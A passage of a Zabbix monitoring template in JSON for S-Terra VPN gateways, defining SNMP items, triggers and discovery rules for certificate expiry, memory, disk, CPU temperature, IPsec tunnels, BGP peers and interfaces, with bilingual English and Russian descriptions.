                        ""description"": ""Exit code for 'get_days_until_local_cert_exp' script.\n\nThis item will be polled at 12:00 and at 00:00.\n\n\u041a\u043e\u0434 \u0432\u043e\u0437\u0432\u0440\u0430\u0442\u0430 \u0434\u043b\u044f \u0441\u043a\u0440\u0438\u043f\u0442\u0430 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 \u0434\u043d\u0435\u0439 \u0434\u043e \u0438\u0441\u0442\u0435\u0447\u0435\u043d\u0438\u044f \u0441\u0440\u043e\u043a\u0430 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0441\u0435\u0440\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u0430.\n\n\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0437\u0430\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432 12:00 \u0438 \u0432 00:00."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ],
                        ""triggers"": [
                            {
                                ""uuid"": ""4e7e1b466608471b86457307ce5369c0"",
                                ""expression"": ""last(/S-Terra Gates SNMPv2/get_days_until_local_cert_exp_res)=1"",
                                ""name"": ""Days until local certificate expires Trigger (exit 1)"",
                                ""priority"": ""WARNING"",
                                ""description"": ""Internal script error. There might be something wrong with script.\n\n\u0412\u043d\u0443\u0442\u0440\u0435\u043d\u043d\u044f\u044f \u043e\u0448\u0438\u0431\u043a\u0430. \u0427\u0442\u043e-\u0442\u043e \u043d\u0435 \u0442\u0430\u043a \u0441\u043e \u0441\u043a\u0440\u0438\u043f\u0442\u043e\u043c."",
                                ""manual_close"": ""YES""
                            },
                            {
                                ""uuid"": ""b6ada21447b14257908d8e2583dc257f"",
                                ""expression"": ""last(/S-Terra Gates SNMPv2/get_days_until_local_cert_exp_res)=2"",
                                ""name"": ""Days until local certificate expires Trigger (exit 2)"",
                                ""priority"": ""WARNING"",
                                ""description"": ""Local certificate has expired!\n\n\u0421\u0440\u043e\u043a \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0441\u0435\u0440\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u0430 \u0438\u0441\u0442\u0435\u043a!"",
                                ""manual_close"": ""YES""
                            },
                            {
                                ""uuid"": ""0ea10687cddf4d9b9aed4e3cb12e9b79"",
                                ""expression"": ""last(/S-Terra Gates SNMPv2/get_days_until_local_cert_exp_res)=3"",
                                ""name"": ""Days until local certificate expires Trigger (exit 3)"",
                                ""priority"": ""WARNING"",
                                ""description"": ""Days until expiration had not been updated for more then a day!\n\n\u0412\u0440\u0435\u043c\u044f \u0434\u043e \u0438\u0441\u0442\u0435\u0447\u0435\u043d\u0438\u044f \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0441\u0435\u0440\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u0430 \u043d\u0435 \u043e\u0431\u043d\u043e\u0432\u043b\u044f\u043b\u043e\u0441\u044c \u0431\u043e\u043b\u0435\u0435 \u0434\u043d\u044f!"",
                                ""manual_close"": ""YES""
                            },
                            {
                                ""uuid"": ""298ef795a3114091b2d9bc3b62d3f927"",
                                ""expression"": ""last(/S-Terra Gates SNMPv2/get_days_until_local_cert_exp_res)=4"",
                                ""name"": ""Days until local certificate expires Trigger (exit 4)"",
                                ""priority"": ""WARNING"",
                                ""description"": ""Machine does not have a local certificate!\n\n\u041b\u043e\u043a\u0430\u043b\u044c\u043d\u044b\u0439 \u0441\u0435\u0440\u0442\u0438\u0444\u0438\u043a\u0430\u0442 \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442!"",
                                ""manual_close"": ""YES""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""1190143d56114661b723d60a2f18df62"",
                        ""name"": ""Hostname"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""SNMPv2-MIB::sysName.0"",
                        ""key"": ""get_hostname_string"",
                        ""delay"": ""60s"",
                        ""trends"": ""0"",
                        ""value_type"": ""TEXT"",
                        ""description"": ""An administratively-assigned name for this managed node. By convention, this is the node's fully-qualified domain name. If the name is unknown, the value is the zero-length string.\n\n\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u0438\u0432\u043d\u043e \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0435 \u0438\u043c\u044f. \u041e\u0431\u044b\u0447\u043d\u043e \u0434\u043e\u043b\u0436\u043d\u043e \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u043e\u0432\u0430\u0442\u044c FQDN \u0445\u043e\u0441\u0442\u0430. \u0415\u0441\u043b\u0438 \u0438\u043c\u044f \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u043e, \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0431\u0443\u0434\u0435\u0442 \u0440\u0430\u0432\u043d\u043e \u043d\u0443\u043b\u0435\u0432\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0435."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""System Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""81a5f212510e41df8c01e3410b7e1872"",
                        ""name"": ""High priority packets dropped"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\""high_prio_dropped_pkts\"""",
                        ""key"": ""high_prio_dropped_pkts"",
                        ""description"": ""High priority packets dropped from kstat_show output.\n\n\u0427\u0438\u0441\u043b\u043e \u043f\u043e\u0442\u0435\u0440\u044f\u043d\u043d\u044b\u0445 \u043f\u0430\u043a\u0435\u0442\u043e\u0432 \u0441 \u043c\u0435\u0442\u043a\u043e\u0439 high priority \u0438\u0437 \u0432\u044b\u0432\u043e\u0434\u0430 \u0443\u0442\u0438\u043b\u0438\u0442\u044b kstat_show. \u042d\u0442\u043e\u0442 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d \u0434\u043b\u044f \u0448\u043b\u044e\u0437\u043e\u0432 DP."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""a946643a9e524b17b1eb9042d975973a"",
                        ""name"": ""IPsec dropped packets percentage"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\""ipsec_dropped_percentage\"""",
                        ""key"": ""ipsec_dropped_percentage"",
                        ""value_type"": ""FLOAT"",
                        ""units"": ""%"",
                        ""description"": ""Dropped packets percentage of total number of sent and received IPsec packets.\n\n\u041f\u0440\u043e\u0446\u0435\u043d\u0442 \u043f\u043e\u0442\u0435\u0440\u044f\u043d\u043d\u044b\u0445 IPsec \u043f\u0430\u043a\u0435\u0442\u043e\u0432 \u043e\u0442 \u043e\u0431\u0449\u0435\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0445 IPsec \u043f\u0430\u043a\u0435\u0442\u043e\u0432."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""837813a6ab7743299be446e16c6e0da4"",
                        ""name"": ""Low priority packets dropped"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\""low_prio_dropped_pkts\"""",
                        ""key"": ""low_prio_dropped_pkts"",
                        ""description"": ""Low priority packets dropped from kstat_show output.\n\n\u0427\u0438\u0441\u043b\u043e \u043f\u043e\u0442\u0435\u0440\u044f\u043d\u043d\u044b\u0445 \u043f\u0430\u043a\u0435\u0442\u043e\u0432 \u0441 \u043c\u0435\u0442\u043a\u043e\u0439 low priority \u0438\u0437 \u0432\u044b\u0432\u043e\u0434\u0430 \u0443\u0442\u0438\u043b\u0438\u0442\u044b kstat_show. \u042d\u0442\u043e\u0442 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d \u0434\u043b\u044f \u0448\u043b\u044e\u0437\u043e\u0432 DP."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""f89d54afbdb64bda89d816f0e080064e"",
                        ""name"": ""Power supply 1 state"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutLine.\""get_power_state\"".1"",
                        ""key"": ""pwr_supply_1"",
                        ""trends"": ""0"",
                        ""status"": ""DISABLED"",
                        ""value_type"": ""TEXT"",
                        ""description"": ""Shows power state for suppliy 1.\n\nAvailable values:\n  up - everithing is OK\n  down - power supply is down\n  unknown - supply has unknown state (can be absent)\n\nSupported platforms:\n  NCA-5210\n  FW-8894"",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Power Supply""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""5bccfb8084814ae4af3f1726ac899a0e"",
                        ""name"": ""Power supply 2 state"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutLine.\""get_power_state\"".2"",
                        ""key"": ""pwr_supply_2"",
                        ""trends"": ""0"",
                        ""status"": ""DISABLED"",
                        ""value_type"": ""TEXT"",
                        ""description"": ""Shows power state for suppliy 2.\n\nAvailable values:\n  up - everithing is OK\n  down - power supply is down\n  unknown - supply has unknown state (can be absent)\n\nSupported platforms:\n  NCA-5210\n  FW-8894"",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Power Supply""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""b45fb0381c6949789adceb8ca358c85c"",
                        ""name"": ""RAM available"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""HOST-RESOURCES-MIB::hrStorageSize.1"",
                        ""key"": ""ram_avaliable"",
                        ""delay"": ""20s"",
                        ""units"": ""B"",
                        ""description"": ""Total RAM available.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u043e\u0439 \u043e\u043f\u0435\u0440\u0430\u0442\u0438\u0432\u043d\u043e\u0439 \u043f\u0430\u043c\u044f\u0442\u0438 \u0432 \u0431\u0430\u0439\u0442\u0430\u0445."",
                        ""preprocessing"": [
                            {
                                ""type"": ""MULTIPLIER"",
                                ""parameters"": [
                                    ""1024""
                                ]
                            }
                        ],
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""System Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""04562ca0b5f44b0abb50a5d38ee57154"",
                        ""name"": ""RAM used"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""HOST-RESOURCES-MIB::hrStorageUsed.1"",
                        ""key"": ""ram_used"",
                        ""delay"": ""20s"",
                        ""units"": ""B"",
                        ""description"": ""Total RAM used.\n\n\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u043e\u043f\u0435\u0440\u0430\u0442\u0438\u0432\u043d\u043e\u0439 \u043f\u0430\u043c\u044f\u0442\u0438 \u0432 \u0431\u0430\u0439\u0442\u0430\u0445."",
                        ""preprocessing"": [
                            {
                                ""type"": ""MULTIPLIER"",
                                ""parameters"": [
                                    ""1024""
                                ]
                            }
                        ],
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""System Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""304a9d0a0ecf407c84f7299c204a3e95"",
                        ""name"": ""RAM usage"",
                        ""type"": ""CALCULATED"",
                        ""key"": ""ram_used_percent"",
                        ""units"": ""%"",
                        ""params"": ""100*last(//ram_used)/last(//ram_avaliable)"",
                        ""description"": ""Used RAM in percent.\n\n\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u043e\u043f\u0435\u0440\u0430\u0442\u0438\u0432\u043d\u043e\u0439 \u043f\u0430\u043c\u044f\u0442\u0438 \u0432 \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u0430\u0445."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""System Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""f55ed1d60d2c48aab9078e941c034b0d"",
                        ""name"": ""SLA. Jitter"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\""get_jitter\"""",
                        ""key"": ""sla_jitter"",
                        ""value_type"": ""FLOAT"",
                        ""units"": ""ms"",
                        ""description"": ""Getting Jitter to host specified in /opt/snmp_monitoring/snmp_extend/get_rtt_jitter_loss/get_rtt_jitter_loss.cron.bash\n\n\u0414\u0436\u0438\u0442\u0442\u0435\u0440 \u043f\u0440\u0438 \u043f\u0438\u043d\u0433\u0435 \u0445\u043e\u0441\u0442\u0430, \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u0432 \u0441\u043a\u0440\u0438\u043f\u0442\u0435 /opt/snmp_monitoring/snmp_extend/get_rtt_jitter_loss/get_rtt_jitter_loss.cron.bash."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""ebdcb58ddad443e4b5291bc06d479a23"",
                        ""name"": ""SLA. Loss"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\""get_loss\"""",
                        ""key"": ""sla_loss"",
                        ""value_type"": ""FLOAT"",
                        ""units"": ""%"",
                        ""description"": ""Getting loss in percent to host specified in /opt/snmp_monitoring/snmp_extend/get_rtt_jitter_loss/get_rtt_jitter_loss.cron.bash\n\n\u041f\u043e\u0442\u0435\u0440\u0438 \u043f\u0440\u0438 \u043f\u0438\u043d\u0433\u0435 \u0445\u043e\u0441\u0442\u0430, \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u0432 \u0441\u043a\u0440\u0438\u043f\u0442\u0435 /opt/snmp_monitoring/snmp_extend/get_rtt_jitter_loss/get_rtt_jitter_loss.cron.bash."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""8eb19304226e4c4e9919accfd42dc0b7"",
                        ""name"": ""SLA. RTT"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\""get_rtt\"""",
                        ""key"": ""sla_rtt"",
                        ""value_type"": ""FLOAT"",
                        ""units"": ""ms"",
                        ""description"": ""Getting RTT (round trip time) to host specified in /opt/snmp_monitoring/snmp_extend/get_rtt_jitter_loss/get_rtt_jitter_loss.cron.bash\n\n\u041a\u0440\u0443\u0433\u043e\u0432\u0430\u044f \u0437\u0430\u0434\u0435\u0440\u0436\u043a\u0430 (RTT) \u043f\u0440\u0438 \u043f\u0438\u043d\u0433\u0435 \u0445\u043e\u0441\u0442\u0430, \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u0432 \u0441\u043a\u0440\u0438\u043f\u0442\u0435 /opt/snmp_monitoring/snmp_extend/get_rtt_jitter_loss/get_rtt_jitter_loss.cron.bash."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""2c4987b815484964ad441f153b240a20"",
                        ""name"": ""Trap All"",
                        ""type"": ""SNMP_TRAP"",
                        ""key"": ""snmptrap[]"",
                        ""delay"": ""0"",
                        ""trends"": ""0"",
                        ""value_type"": ""LOG"",
                        ""description"": ""Receive all SNMP traps.\n\n\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0432\u0441\u0435 SNMP \u0442\u0440\u0430\u043f\u044b ."",
                        ""logtimefmt"": ""%H:%M:%S %Y/%m/%d"",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""SNMP Traps""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""c7fded4d95b54259a30bddd2d9bd6740"",
                        ""name"": ""Number of active IPsec tunnels with S-Terra Unit"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""S-TERRA-CSP-MIB::stIpSecGlobalActiveUnitTunnels.0"",
                        ""key"": ""stIpSecGlobalActiveUnitTunnels"",
                        ""delay"": ""20s"",
                        ""description"": ""The total number of currently active IPsec Phase-2 Tunnels with S-Terra Unit.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u0445 IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439 \u0441 S-Terra Unit.\n(\u0422\u043e\u043b\u044c\u043a\u043e \u0434\u043b\u044f \u0432\u0435\u0440\u0441\u0438\u0438 4.3)"",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""66cc19eb30804b7cbfd4ff278271fa7b"",
                        ""name"": ""System Description"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""SNMPv2-MIB::sysDescr.0"",
                        ""key"": ""system_description"",
                        ""delay"": ""60s"",
                        ""trends"": ""0"",
                        ""value_type"": ""TEXT"",
                        ""description"": ""This value should include the full name and version identification of the system's hardware type, software operating-system, and networking software.\n\n\u0422\u0435\u043a\u0441\u0442\u043e\u0432\u043e\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u043f\u043b\u0430\u0442\u0444\u043e\u0440\u043c\u044b."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""System Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""0b5c8aa291804d32b948c92245c88a14"",
                        ""name"": ""System uptime"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""HOST-RESOURCES-MIB::hrSystemUptime.0"",
                        ""key"": ""system_uptime"",
                        ""delay"": ""30s"",
                        ""units"": ""s"",
                        ""description"": ""The amount of time since this host was last initialized.\n\u0412\u0440\u0435\u043c\u044f \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0439 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u0441\u0438\u0441\u0442\u0435\u043c\u044b"",
                        ""preprocessing"": [
                            {
                                ""type"": ""MULTIPLIER"",
                                ""parameters"": [
                                    ""0.01""
                                ]
                            }
                        ],
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""System Monitoring""
                            }
                        ]
                    }
                ],
                ""discovery_rules"": [
                    {
                        ""uuid"": ""7a644dc76ca34c9ea92dcfe7f6a682ba"",
                        ""name"": ""BGP Peers"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""discovery[{#SNMPVALUE},BGP4-MIB::bgpPeerIdentifier]"",
                        ""key"": ""bgpPeerIdentifier"",
                        ""delay"": ""30s"",
                        ""item_prototypes"": [
                            {
                                ""uuid"": ""11e719cdf5044fd7a771c95dcdae607e"",
                                ""name"": ""BGP Peer \""{#SNMPINDEX}\"" Current State"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""BGP4-MIB::bgpPeerState.{#SNMPINDEX}"",
                                ""key"": ""bgp_peer_state[{#SNMPINDEX}]"",
                                ""delay"": ""30s"",
                                ""description"": ""Peer states:\n- idle = 1\n- connect = 2\n- active = 3\n- opensent = 4\n- openconfirm = 5\n- established = 6"",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""BGP Monitoring""
                                    }
                                ]
                            }
                        ]
                    },
                    {
                        ""uuid"": ""11f07f3f4a454d0ea9b74ee4a1212a6e"",
                        ""name"": ""Disk Path Discovery"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""discovery[{#DISKPATH},UCD-SNMP-MIB::dskPath,{#DISKDEVICE},UCD-SNMP-MIB::dskDevice]"",
                        ""key"": ""disk_paths"",
                        ""delay"": ""30s"",
                        ""filter"": {
                            ""conditions"": [
                                {
                                    ""macro"": ""{#DISKDEVICE}"",
                                    ""value"": ""^tmp"",
                                    ""operator"": ""NOT_MATCHES_REGEX"",
                                    ""formulaid"": ""A""
                                }
                            ]
                        },
                        ""item_prototypes"": [
                            {
                                ""uuid"": ""d17bafd3046c4056868689d009ab2a61"",
                                ""name"": ""Disk error flag ({#DISKPATH})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""UCD-SNMP-MIB::dskErrorFlag.{#SNMPINDEX}"",
                                ""key"": ""disk_paths_errflag[{#DISKPATH}]"",
                                ""delay"": ""30s"",
                                ""description"": ""Error flag signaling that the disk or partition is under the minimum required space configured for it.\n\n\u0424\u043b\u0430\u0433 \u043e\u0448\u0438\u0431\u043a\u0438, \u0433\u043e\u0432\u043e\u0440\u044f\u0449\u0438\u0439 \u043e \u0442\u043e\u043c, \u0447\u0442\u043e \u043d\u0430 \u0440\u0430\u0437\u0434\u0435\u043b\u0435 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0441\u0432\u043e\u0431\u043e\u0434\u043d\u043e\u0435 \u043c\u0435\u0441\u0442\u043e."",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ],
                                ""trigger_prototypes"": [
                                    {
                                        ""uuid"": ""0909bb092cf44e7bbc975d8e06c3e99b"",
                                        ""expression"": ""last(/S-Terra Gates SNMPv2/disk_paths_errflag[{#DISKPATH}])=1"",
                                        ""name"": ""{#DISKPATH}: Disk space is low"",
                                        ""priority"": ""WARNING"",
                                        ""description"": ""Available space has dropped below 10%.\n\n\u041c\u0430\u043b\u043e \u043c\u0435\u0441\u0442\u0430 \u043d\u0430 \u0440\u0430\u0437\u0434\u0435\u043b\u0435: \u043d\u0430 \u0440\u0430\u0437\u0434\u0435\u043b\u0435 \u0434\u0438\u0441\u043a\u0430 \u043e\u0441\u0442\u0430\u043b\u043e\u0441\u044c \u043c\u0435\u043d\u0435\u0435 10% \u0441\u0432\u043e\u0431\u043e\u0434\u043d\u043e\u0433\u043e \u043c\u0435\u0441\u0442\u0430."",
                                        ""manual_close"": ""YES""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""6157026c7d7842eb866868d4c536ce55"",
                                ""name"": ""Disk space available ({#DISKPATH})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""UCD-SNMP-MIB::dskAvail.{#SNMPINDEX}"",
                                ""key"": ""disk_paths_spaceavail[{#DISKPATH}]"",
                                ""delay"": ""30s"",
                                ""units"": ""B"",
                                ""description"": ""Available space on the disk (in Bytes).\n\n\u0414\u043e\u0441\u0442\u0443\u043f\u043d\u043e\u0435 \u043c\u0435\u0441\u0442\u043e \u043d\u0430 \u0440\u0430\u0437\u0434\u0435\u043b\u0435 \u0432 \u0431\u0430\u0439\u0442\u0430\u0445."",
                                ""preprocessing"": [
                                    {
                                        ""type"": ""MULTIPLIER"",
                                        ""parameters"": [
                                            ""1024""
                                        ]
                                    }
                                ],
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            }
                        ]
                    },
                    {
                        ""uuid"": ""da4b77ad375f4fef9d14f580dfea5f7c"",
                        ""name"": ""LM-SENSORS CPU cores discovery"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""discovery[{#CPU_CORE},LM-SENSORS-MIB::lmTempSensorsDevice,{#SENSOR_INDEX},LM-SENSORS-MIB::lmTempSensorsIndex]"",
                        ""key"": ""lmsensors_cpu_cores"",
                        ""delay"": ""30s"",
                        ""filter"": {
                            ""conditions"": [
                                {
                                    ""macro"": ""{#CPU_CORE}"",
                                    ""value"": ""^Core"",
                                    ""formulaid"": ""A""
                                }
                            ]
                        },
                        ""item_prototypes"": [
                            {
                                ""uuid"": ""85f5bb994b644dcf8159a7b3acf87b55"",
                                ""name"": ""CPU {#CPU_CORE} temperature"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""LM-SENSORS-MIB::lmTempSensorsValue.{#SENSOR_INDEX}"",
                                ""key"": ""lmsensors_temperature_[{#CPU_CORE}]"",
                                ""delay"": ""30s"",
                                ""value_type"": ""FLOAT"",
                                ""units"": ""C"",
                                ""description"": ""Temperature in Celsius of the selected CPU core.\n\n\u0422\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u0430 \u0432 \u0433\u0440\u0430\u0434\u0443\u0441\u0430\u0445 \u0426\u0435\u043b\u044c\u0441\u0438\u044f \u043d\u0430 \u0434\u0430\u043d\u043d\u043e\u043c \u044f\u0434\u0440\u0435 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440\u0430."",
                                ""preprocessing"": [
                                    {
                                        ""type"": ""MULTIPLIER"",
                                        ""parameters"": [
                                            ""0.001""
                                        ]
                                    }
                                ],
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            }
                        ]
                    },
                    {
                        ""uuid"": ""c9e1d57a9b9743b985dbe3945a1c5d22"",
                        ""name"": ""Local Certificate Discovery"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""discovery[{#CERTINDEX},NET-SNMP-EXTEND-MIB::nsExtendOutLine.\""local_certs_index\""]"",
                        ""key"": ""local_certificates"",
                        ""delay"": ""0;h0"",
                        ""filter"": {
                            ""conditions"": [
                                {
                                    ""macro"": ""{#CERTINDEX}"",
                                    ""value"": ""^[0-9]+$"",
                                    ""formulaid"": ""A""
                                }
                            ]
                        },
                        ""item_prototypes"": [
                            {
                                ""uuid"": ""b7434ed59c694135ba466c71c4873f12"",
                                ""name"": ""Local Certificate Index {#CERTINDEX} Days Until Expiry"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutLine.\""local_certs_days_til_exp\"".{#SNMPINDEX}"",
                                ""key"": ""cert_days_til_expiry[{#CERTINDEX}]"",
                                ""delay"": ""1h"",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""Extended""
                                    }
                                ],
                                ""trigger_prototypes"": [
                                    {
                                        ""uuid"": ""9953e87c0cd34b75b79a4b92b22a85fa"",
                                        ""expression"": ""last(/S-Terra Gates SNMPv2/cert_days_til_expiry[{#CERTINDEX}])<=7"",
                                        ""name"": ""1 week left until certificate with index {#CERTINDEX} expiry"",
                                        ""priority"": ""HIGH"",
                                        ""description"": ""Certificate will expire soon.\n\n\u0421\u0440\u043e\u043a \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u0441\u0435\u0440\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u0430 \u0441\u043a\u043e\u0440\u043e \u0438\u0441\u0442\u0435\u0447\u0435\u0442.""
                                    }
                                ]
                            }
                        ]
                    },
                    {
                        ""uuid"": ""2516e52921d64a68b7b8238fbc51f216"",
                        ""name"": ""Trivial network interface discovery"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""discovery[{#NETWORKIFACENAME},IF-MIB::ifName]"",
                        ""key"": ""network_interfaces"",
                        ""delay"": ""30s"",
                        ""filter"": {
                            ""evaltype"": ""AND"",
                            ""conditions"": [
                                {
                                    ""macro"": ""{#NETWORKIFACENAME}"",
                                    ""value"": ""@Network interfaces for discovery"",
                                    ""formulaid"": ""A""
                                }
                            ]
                        },
                        ""item_prototypes"": [
                            {
                                ""uuid"": ""f1493ac224c64f73b07d5f8fe728cd91"",
                                ""name"": ""Administrative status ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifAdminStatus.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_admstat[{#NETWORKIFACENAME}]"",
                                ""delay"": ""30s"",
